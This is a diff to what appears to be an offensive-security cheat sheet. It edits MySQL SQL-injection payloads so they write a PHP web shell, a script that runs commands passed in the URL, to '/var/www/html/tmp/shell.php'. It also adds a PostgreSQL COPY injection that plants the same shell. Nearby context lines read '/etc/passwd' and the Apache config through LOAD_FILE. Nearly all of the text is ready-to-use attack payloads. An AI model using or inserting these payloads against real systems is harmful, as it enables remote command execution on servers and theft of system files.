@@ -2846,7 +2846,7 @@ SELECT LOAD_FILE('/etc/passwd')
 LOAD_FILE('/etc/httpd/conf/httpd.conf')
 ```
 ```c
-select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/tmp/<FILE>.php";
+select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/tmp/shell.php";
 ```
 
 or
@@ -2855,8 +2855,15 @@ or
 LOAD_FILE('/etc/httpd/conf/httpd.conf')
 ```
 ```c
-' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/<FILE>.php" -- //
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/shell.php" -- //
 ```
+
+##### Postgresql
+###### Create Webshell
+```c
+'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/tmp/shell.php' --
+```
+
 
 ##### MSSQL
 
